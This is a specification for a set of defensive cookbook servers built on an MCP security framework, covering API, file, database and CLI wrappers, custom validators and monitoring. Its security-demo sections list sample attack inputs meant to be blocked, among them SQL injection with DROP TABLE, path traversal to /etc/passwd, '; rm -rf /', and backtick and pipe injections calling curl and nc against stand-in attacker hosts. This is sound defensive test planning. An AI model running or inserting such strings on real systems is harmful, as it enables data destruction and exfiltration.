# MCP Security Framework - Cookbook Examples Specification

## Project Overview

Create 8 practical cookbook examples demonstrating real-world usage of the mcp-security framework. Each cookbook should be a fully functional, production-ready MCP server showcasing different security patterns and features.

**Target Audience:** Developers building MCP servers who need reference implementations  
**Language:** TypeScript with strict mode  
**Testing:** Vitest with >80% coverage per cookbook  
**Documentation:** Detailed README with security analysis

---

## Global Requirements

### Directory Structure (per cookbook)
```
cookbooks/[cookbook-name]/
├── README.md              # Main documentation
├── package.json           # Dependencies
├── tsconfig.json          # TypeScript config (extends base)
├── src/
│   ├── index.ts          # Server implementation
│   ├── tools/            # Tool definitions
│   └── utils/            # Helper functions
├── examples/
│   ├── basic-usage.md    # Simple examples
│   ├── advanced.md       # Complex scenarios
│   └── security-demo.md  # Attack attempts that get blocked
├── test/
│   ├── integration.test.ts
│   └── security.test.ts  # Actual attack vector tests
└── .env.example          # Required environment variables
```

### Technical Standards
- TypeScript 5.0+ with `strict: true`
- Use `mcp-security` v0.9.0+
- Include both basic and advanced configuration examples
- All tools must have Zod schemas
- Include Claude Desktop config snippet in README
- Performance benchmarks in README (requests/sec, latency)

### Documentation Standards
Each README must include:
1. **Overview** - What problem this solves
2. **Security Features Demonstrated** - Which layers/validations shown
3. **Installation** - Step-by-step setup
4. **Configuration** - Basic and advanced options
5. **Tools Reference** - Each tool documented with examples
6. **Security Analysis** - What attacks are prevented and how
7. **Performance** - Benchmarks and optimization tips
8. **Common Issues** - Troubleshooting guide
9. **Claude Desktop Integration** - Copy-paste config

---

## ~~Cookbook 1: External API Wrapper~~ ✅

**Path:** `cookbooks/api-wrapper-server/` - **COMPLETE**

### Purpose
Demonstrate safe wrapping of third-party REST APIs with domain restrictions, rate limiting, and response validation.

### Implementation Requirements

**Tools to Implement:**
1. `weather-forecast` - OpenWeatherMap API wrapper
   - Parameters: city (string), units (enum: metric/imperial)
   - Domain: `api.openweathermap.org` only
   - Rate limit: 10/minute
   - Max response: 50KB

2. `currency-convert` - Exchange rate API wrapper
   - Parameters: from (string), to (string), amount (number)
   - Domain: `api.exchangerate-api.com` only
   - Rate limit: 5/minute
   - Validate currency codes (ISO 4217)

3. `news-headlines` - News API wrapper
   - Parameters: category (enum), country (string)
   - Domain: `newsapi.org` only
   - Rate limit: 3/minute
   - Content validation: strip HTML, limit 10 articles

**Security Features to Showcase:**
- Layer 4: Per-tool rate limiting and egress control
- Layer 5: Domain allowlist enforcement
- Layer 5: Response content validation
- API key handling without exposure

**Configuration Examples:**
```typescript
// Basic config with domain restrictions
// Advanced config with custom response validators
// Production config with monitoring
```

**Security Demo:**
- Attempt to call blocked domain (evil.com) → blocked by Layer 5
- Attempt SSRF to AWS metadata endpoint → blocked by Layer 2
- Exceed rate limit → blocked by Layer 4
- Response >50KB → blocked by Layer 4

**Test Coverage:**
- Valid API calls return data
- Domain restrictions enforced
- Rate limits enforced per tool
- Large responses truncated
- Invalid parameters rejected

---

## ~~Cookbook 2: File Operations Server~~ ✅

**Path:** `cookbooks/filesystem-server/` - **COMPLETE**

### Purpose
Demonstrate Layer 4 resource policies for safe file system operations.

### Implementation Requirements

**Tools to Implement:**
1. `read-file` - Safe file reading
   - Parameters: filepath (string)
   - Restricted to `./data/` and `./documents/`
   - Deny globs: `**/*.key`, `**/.env`, `/etc/**`
   - Max file size: 2MB

2. `list-directory` - Directory listing
   - Parameters: path (string)
   - Same restrictions as read-file
   - Max 1000 entries

3. `search-files` - Text search in files
   - Parameters: pattern (string), directory (string)
   - Same restrictions
   - Max 100 file scan limit

4. `write-log` - Append-only log writing
   - Parameters: message (string), level (enum)
   - Restricted to `./logs/` only
   - Max message: 10KB
   - Side effect: 'write'

**Security Features to Showcase:**
- Layer 4: `resourcePolicy` with rootDirs and denyGlobs
- Layer 4: `maxReadBytes` enforcement
- Layer 4: Side effect declarations (read vs write)
- Layer 2: Path traversal prevention

**Configuration Examples:**
```typescript
// Resource policy with multiple root directories
// Deny patterns for sensitive files
// Per-tool read/write quotas
```

**Security Demo:**
- Path traversal attempt: `../../etc/passwd` → blocked
- Read .env file → blocked by denyGlobs
- Read file outside rootDirs → blocked
- Write to read-only tool → blocked by side effect declaration
- File >2MB → blocked by maxReadBytes

**Test Coverage:**
- Valid file operations succeed
- Path traversal blocked at Layer 2 and Layer 4
- Deny globs enforced
- Root directory restrictions enforced
- Size limits enforced
- Write operations tracked

---

## ~~Cookbook 3: Database Server~~ ✅

**Path:** `cookbooks/database-server/` - **COMPLETE**

### Purpose
Demonstrate safe database operations with SQL injection prevention and query validation.

### Implementation Requirements

**Tools to Implement:**
1. `query-users` - User search
   - Parameters: search (string), limit (number)
   - Parameterized queries only
   - Side effect: 'read'
   - Max results: 100

2. `create-order` - Insert order
   - Parameters: userId (number), items (array), total (number)
   - Transaction support
   - Side effect: 'write'
   - Quota: 10/minute

3. `generate-report` - Complex analytics query
   - Parameters: startDate (string), endDate (string), groupBy (enum)
   - Read-only view
   - Side effect: 'read'
   - Max response: 500KB
   - Quota: 2/minute (expensive operation)

4. `health-check` - Database connection status
   - No parameters
   - Side effect: 'none'
   - No quota

**Security Features to Showcase:**
- Layer 2: SQL injection pattern detection
- Layer 4: Parameterized queries validation
- Layer 4: Different quotas for different operation costs
- Layer 4: Side effect enforcement
- Layer 4: Response size limits

**Database Setup:**
- SQLite in-memory for examples
- Seed data script included
- Schema migration example

**Configuration Examples:**
```typescript
// Per-tool quotas based on operation cost
// Tool registry with side effects
// Egress control for large reports
```

**Security Demo:**
- SQL injection: `' OR 1=1; DROP TABLE users; --` → blocked by Layer 2
- NoSQL injection: `{"$where": "..."}` → blocked by Layer 2
- Exceed expensive query quota → blocked by Layer 4
- Large report >500KB → truncated by Layer 4
- Write operation via read tool → prevented by side effects

**Test Coverage:**
- Parameterized queries execute safely
- SQL injection attempts blocked
- Quotas enforced per tool
- Side effects enforced
- Response size limits work
- Transaction rollback on error

---

## Cookbook 4: CLI Tool Wrapper

**Path:** `cookbooks/cli-wrapper-server/`

### Purpose
Demonstrate safe wrapping of command-line tools with command injection prevention.

### Implementation Requirements

**Tools to Implement:**
1. `git-status` - Git repository status
   - Parameters: repoPath (string)
   - Allowed commands: `['git status', 'git branch', 'git log']`
   - Working directory validation
   - Timeout: 5 seconds

2. `image-resize` - ImageMagick wrapper
   - Parameters: inputPath (string), width (number), height (number)
   - Allowed command: `convert` with specific args only
   - Input validation: PNG/JPG only
   - Output size validation

3. `pdf-metadata` - PDF info extraction
   - Parameters: pdfPath (string)
   - Allowed command: `pdfinfo` only
   - No shell execution, direct argv
   - Output parsing and validation

4. `encode-video` - FFmpeg wrapper
   - Parameters: inputPath (string), format (enum), quality (enum)
   - Allowlist of safe FFmpeg arguments
   - Timeout: 30 seconds
   - Progress tracking

**Security Features to Showcase:**
- Layer 2: Command injection detection (pipes, backticks, $(), etc.)
- Layer 5: Command allowlist validation
- Layer 5: Argument sanitization
- Layer 4: Timeout enforcement
- Layer 4: Working directory restrictions

**Configuration Examples:**
```typescript
// Command allowlist with argument templates
// Timeout and resource limits
// Output validation
```

**Security Demo:**
- Command injection: `; rm -rf /` → blocked by Layer 2
- Backtick injection: `\`curl evil.com\`` → blocked by Layer 2
- Pipe injection: `| nc attacker.com` → blocked by Layer 2
- Unauthorized command: `rm` → blocked by Layer 5 allowlist
- Path traversal in arguments → blocked by Layer 4

**Test Coverage:**
- Safe commands execute successfully
- Command injection blocked at Layer 2
- Unauthorized commands blocked at Layer 5
- Timeouts enforced
- Output validation works
- No shell spawning vulnerabilities

---

## ~~Cookbook 5: Multi-Tool Business Application~~ ⏭️ SKIPPED

**Path:** `cookbooks/crm-server/` - **SKIPPED** (redundant with database-server)

### Purpose
Demonstrate a realistic business application with mixed security profiles across tools.

> **Skip Rationale:** Overlaps significantly with database-server. The unique features (network side effects, mixed quotas) are already demonstrated across existing cookbooks.

### Implementation Requirements

**Tools to Implement:**
1. `search-customers` - Customer lookup
   - Parameters: query (string), limit (number)
   - Side effect: 'read'
   - High quota: 60/minute
   - Fast response required

2. `create-invoice` - Generate invoice
   - Parameters: customerId (number), lineItems (array), dueDate (string)
   - Side effect: 'write'
   - Low quota: 10/minute
   - Input validation required
   - Business logic: validate totals, tax calculation

3. `send-email` - Email notification
   - Parameters: to (string), template (enum), data (object)
   - Side effect: 'network'
   - Very low quota: 5/minute
   - Email validation required
   - Rate limiting critical

4. `generate-sales-report` - Analytics
   - Parameters: period (enum), format (enum)
   - Side effect: 'read'
   - Expensive quota: 2/minute
   - Large egress: 1MB max
   - Caching recommended

5. `update-customer` - Modify customer data
   - Parameters: customerId (number), fields (object)
   - Side effect: 'write'
   - Medium quota: 20/minute
   - Field validation required

**Security Features to Showcase:**
- Layer 4: Different quotas per tool based on cost/risk
- Layer 4: Side effect declarations enforced
- Layer 4: Egress control on large reports
- Layer 5: Custom business logic validation
- Layer 5: Email validation
- All layers working together

**Configuration Examples:**
```typescript
// Complex tool registry with varied profiles
// Business logic validators in Layer 5
// Production monitoring setup
```

**Security Demo:**
- Rate limit enforcement varies by tool
- Email injection attempt blocked
- Invoice manipulation blocked by business logic
- Report spam prevented by quota
- XSS in customer name blocked

**Test Coverage:**
- Each tool respects its quota
- Side effects enforced
- Business logic validation works
- All security layers active
- Realistic usage patterns tested

---

## Cookbook 6: Custom Layer 5 Validators

**Path:** `cookbooks/advanced-validation/`

### Purpose
Deep dive into Layer 5 extensibility with custom validators.

### Implementation Requirements

**Custom Validators to Implement:**
1. **PII Detector** - Scans responses for sensitive data
   - Detects: SSN, credit cards, emails, phone numbers
   - Priority: 10 (high)
   - Redacts or blocks based on config

2. **Business Hours Validator** - Time-based access control
   - Blocks expensive operations outside business hours
   - Priority: 5
   - Configurable timezone and hours

3. **Geofencing Validator** - IP-based restrictions
   - Mock IP geolocation
   - Allowlist/blocklist countries
   - Priority: 3

4. **Response Size Analyzer** - Advanced egress control
   - Tracks cumulative egress per session
   - Alert on unusual patterns
   - Priority: 8

5. **Contextual Rate Limiter** - Smart rate limiting
   - Different limits based on request context
   - Learns normal patterns
   - Priority: 7

**Tools Using Validators:**
- `financial-query` - Uses PII detector
- `batch-process` - Uses business hours validator
- `export-data` - Uses response size analyzer
- `api-call` - Uses geofencing

**Security Features to Showcase:**
- Layer 5: Custom validator registration
- Layer 5: Priority ordering
- Layer 5: Context store usage
- Layer 5: Cross-request state tracking
- Layer 5: Response filtering

**Configuration Examples:**
```typescript
// Custom validator registration with priorities
// Context store patterns
// Validator chaining
```

**Security Demo:**
- PII detected and redacted in response
- Request blocked outside business hours
- Geofencing blocks request from banned country
- Cumulative egress limit reached
- Multiple validators working together

**Test Coverage:**
- Each validator works independently
- Priority ordering enforced
- Context store state management
- Performance impact measured
- Validators can be disabled

---

## Cookbook 7: Observability & Monitoring

**Path:** `cookbooks/monitoring-server/`

### Purpose
Production-ready patterns for monitoring and observability.

### Implementation Requirements

**Features to Implement:**
1. **Security Dashboard Tool**
   - Real-time security events
   - Violation counts by type
   - Top blocked patterns
   - Rate limit status

2. **Metrics Collection**
   - Request latency histograms
   - Success/failure rates
   - Layer-specific metrics
   - Export to Prometheus format

3. **Alert Integration**
   - Webhook to Slack/Discord
   - PagerDuty integration
   - Email alerts
   - Severity-based routing

4. **Audit Logging**
   - Structured log format (JSON)
   - Request/response correlation
   - Security event details
   - Compliance-ready format

5. **Performance Profiler**
   - Per-layer timing
   - Bottleneck identification
   - Cache hit rates
   - Resource usage

**Tools to Implement:**
1. `get-security-metrics` - Real-time metrics
2. `get-audit-log` - Query audit entries
3. `configure-alerts` - Alert rule management
4. `export-metrics` - Prometheus export

**Security Features to Showcase:**
- Layer monitoring at each layer
- Performance metrics don't leak sensitive data
- Audit logs are tamper-evident
- Alert integration is secure

**Configuration Examples:**
```typescript
// Logging configuration for production
// Metrics export setup
// Alert routing rules
```

**Demo:**
- Security event triggers alert
- Metrics dashboard shows layer performance
- Audit log captures full request lifecycle
- Performance profiler identifies slow layer

**Test Coverage:**
- Metrics collected accurately
- Alerts fire correctly
- Audit logs complete
- No sensitive data in logs
- Performance impact minimal

---

## Cookbook 8: Migration Guide

**Path:** `cookbooks/migration-examples/`

### Purpose
Side-by-side comparisons showing migration from vanilla MCP to secure MCP.

### Implementation Requirements

**Before/After Examples:**
1. **Simple Server** - Basic tool migration
   - Before: Vanilla `McpServer`
   - After: `SecureMcpServer` with minimal config
   - Show: Zero-config security gains

2. **API Server** - External API wrapper
   - Before: Manual validation, no rate limiting
   - After: Built-in validation, automatic rate limiting
   - Show: Reduced code, better security

3. **File Server** - Filesystem access
   - Before: Manual path sanitization, custom checks
   - After: Resource policies, automatic protection
   - Show: 100+ lines removed, more secure

4. **Database Server** - SQL operations
   - Before: Manual SQL injection checks
   - After: Automatic detection + parameterized queries
   - Show: Defense-in-depth

**Structure:**
```
examples/
├── 01-simple/
│   ├── before.ts
│   ├── after.ts
│   └── comparison.md
├── 02-api/
│   ├── before.ts
│   ├── after.ts
│   └── comparison.md
├── 03-filesystem/
│   ├── before.ts
│   ├── after.ts
│   └── comparison.md
└── 04-database/
    ├── before.ts
    ├── after.ts
    └── comparison.md
```

**Comparison Metrics:**
- Lines of code (before/after)
- Security features gained
- Performance impact
- Configuration complexity
- Maintenance burden

**Migration Checklist:**
- [ ] Replace `McpServer` with `SecureMcpServer`
- [ ] Add Zod schemas to all tools
- [ ] Configure resource policies (if filesystem)
- [ ] Set rate limits per tool
- [ ] Add Layer 5 validators (if custom logic)
- [ ] Update tests
- [ ] Enable logging for migration period
- [ ] Monitor false positives

**Documentation:**
- Step-by-step migration guide
- Common pitfalls and solutions
- Compatibility matrix
- Rollback strategy

---

## Testing Requirements

### Per Cookbook
Each cookbook must include:

1. **Integration Tests** (`test/integration.test.ts`)
   - All tools execute successfully with valid inputs
   - Basic functionality works end-to-end
   - Claude Desktop config is valid

2. **Security Tests** (`test/security.test.ts`)
   - Documented attack vectors are blocked
   - Layer-specific protections verified
   - No false negatives on real attacks
   - Reasonable false positive rate

3. **Performance Tests** (documented in README)
   - Requests per second benchmark
   - P50, P95, P99 latency
   - Memory usage under load
   - Layer-by-layer timing

### Global Test Suite
Create `cookbooks/test-all.sh` that:
- Runs all cookbook tests
- Validates all examples execute
- Checks all READMEs render correctly
- Verifies Claude Desktop configs

---

## Documentation Deliverables

### Root Cookbooks README
Create `cookbooks/README.md`:
```markdown
# MCP Security Framework - Cookbooks

Collection of production-ready examples for common MCP server patterns.

## Quick Start
[Links to each cookbook]

## By Use Case
- External API Integration → api-wrapper-server
- File System Access → filesystem-server
- Database Operations → database-server
- CLI Tool Wrapping → cli-wrapper-server
- Business Applications → crm-server

## By Security Feature
- Resource Policies → filesystem-server
- Custom Validators → advanced-validation
- Rate Limiting → api-wrapper-server, crm-server
- Response Validation → api-wrapper-server, advanced-validation

## Migration
See migration-examples for before/after comparisons.

## Contributing
[Guidelines for adding new cookbooks]
```

### Individual Cookbook READMEs
Template structure (already defined above in "Documentation Standards")

---

## Implementation Order (Recommended)

1. **api-wrapper-server** - Simplest, most universally applicable
2. **filesystem-server** - Showcases unique resource policy features
3. **migration-examples** - High impact for adoption
4. **cli-wrapper-server** - Builds on filesystem concepts
5. **database-server** - More complex, but common pattern
6. **advanced-validation** - Requires understanding of previous examples
7. **crm-server** - Brings everything together
8. **monitoring-server** - Production concerns, can be last

---

## Success Criteria

Each cookbook should:
- ✅ Run successfully in Claude Desktop without modification
- ✅ Pass all tests with >80% coverage
- ✅ Include working attack demonstrations
- ✅ Demonstrate at least 3 security layers
- ✅ Include performance benchmarks
- ✅ Have clear, actionable documentation
- ✅ Provide copy-paste config examples
- ✅ Show both basic and advanced usage

---

## Notes for Implementation

**Code Style:**
- Follow mcp-security framework conventions
- Use same linting rules as main project
- Consistent error handling patterns
- Clear variable naming

**Dependencies:**
- Minimize external dependencies
- Use well-maintained packages only
- Document why each dependency is needed
- Pin versions for reproducibility

**Examples:**
- Use realistic data (fake but plausible)
- Include both success and failure cases
- Show incremental complexity
- Provide commented code

**Security:**
- Never include real credentials
- Use .env.example for secrets
- Document security assumptions
- Include threat model in README

---

## Deliverables Summary

```
mcp-security/
└── cookbooks/
    ├── README.md                    # Overview and navigation
    ├── api-wrapper-server/          # ✓ Cookbook 1
    ├── filesystem-server/           # ✓ Cookbook 2
    ├── database-server/             # ✓ Cookbook 3
    ├── cli-wrapper-server/          # ✓ Cookbook 4
    ├── crm-server/                  # ✓ Cookbook 5
    ├── advanced-validation/         # ✓ Cookbook 6
    ├── monitoring-server/           # ✓ Cookbook 7
    ├── migration-examples/          # ✓ Cookbook 8
    └── test-all.sh                  # Global test runner
```

Each cookbook directory contains:
- Full TypeScript implementation
- Comprehensive README
- Integration and security tests
- Usage examples
- Claude Desktop config

**Total Files:** ~120-150 files across all cookbooks
**Estimated LOC:** ~8,000-10,000 lines of code + documentation

---

End of Specification